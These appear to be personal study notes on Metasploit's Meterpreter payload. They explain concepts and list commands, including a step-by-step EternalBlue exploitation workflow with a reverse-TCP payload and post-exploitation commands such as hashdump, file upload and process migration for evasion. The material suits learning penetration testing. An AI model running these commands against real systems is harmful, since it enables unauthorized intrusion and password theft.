# Meterpreter Notes

## What is Meterpreter?

Meterpreter is an advanced Metasploit payload used for post-exploitation.

It runs in memory on the target machine and provides an interactive shell with many specialized commands.

It allows:
- File access
- Privilege escalation
- Process migration
- Screenshot capture
- Password hash dumping
- System enumeration

---

# Why Meterpreter Matters

Meterpreter is more powerful than a normal shell because it gives extended control over the compromised system.

Advantages:
- Runs in memory
- Avoids writing files to disk
- Supports encrypted communication
- Large set of built-in commands

---

# Important Meterpreter Concepts

## Payload
Code delivered to the target after exploitation.

Example:
```bash
windows/meterpreter/reverse_tcp
```

## Reverse Shell
The target machine connects back to the attacker machine.

## Session
Active connection between attacker and victim.

---

# Common Meterpreter Commands

## System Information

```bash
sysinfo
```

Displays:
- OS
- computer name
- architecture

---

## Current User

```bash
getuid
```

Shows current user running the session.

---

## Process List

```bash
ps
```

Lists running processes.

---

## Migrate To Another Process

```bash
migrate <PID>
```

Moves Meterpreter into another process.

Useful for:
- stability
- privilege escalation
- evasion

---

## Open Shell

```bash
shell
```

Opens a system command shell on target.

---

## Background Session

```bash
background
```

Sends session to background.

---

## List Sessions

```bash
sessions
```

Lists active Meterpreter sessions.

---

## Reconnect To Session

```bash
sessions -i <session_id>
```

Reconnects to selected session.

Example:
```bash
sessions -i 1
```

---

## Download Files

```bash
download file.txt
```

Downloads file from target.

---

## Upload Files

```bash
upload shell.exe
```

Uploads file to target.

---

## Screenshot

```bash
screenshot
```

Captures victim screen.

---

## Hash Dumping

```bash
hashdump
```

Attempts to dump password hashes.

Requires elevated privileges.

---

# Metasploit Workflow

## 1. Start Metasploit

```bash
msfconsole
```

## 2. Search Exploit

```bash
search smb
```

## 3. Use Module

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

## 4. Show Options

```bash
show options
```

## 5. Set Target

```bash
set RHOSTS <target-ip>
```

## 6. Set Payload

```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

## 7. Set Listener IP

```bash
set LHOST <your-ip>
```

## 8. Run Exploit

```bash
run
```

---

# Important Notes

- Meterpreter is mainly used for post-exploitation.
- Meterpreter commands are different from Linux terminal commands.
- Meterpreter works inside Metasploit sessions.
- Stable sessions matter during engagements.
- Privilege escalation often comes after initial access.

---

# Key Terms

| Term | Meaning |
|---|---|
| Payload | Code executed on target |
| Exploit | Code abusing vulnerability |
| Session | Active connection |
| Reverse TCP | Victim connects back |
| Post-exploitation | Actions after compromise |

---

# Things I Learned

- Difference between shell and Meterpreter
- How sessions work
- Basic Meterpreter commands
- Why reverse payloads are common
- How Metasploit workflow operates
-overall Metasploit
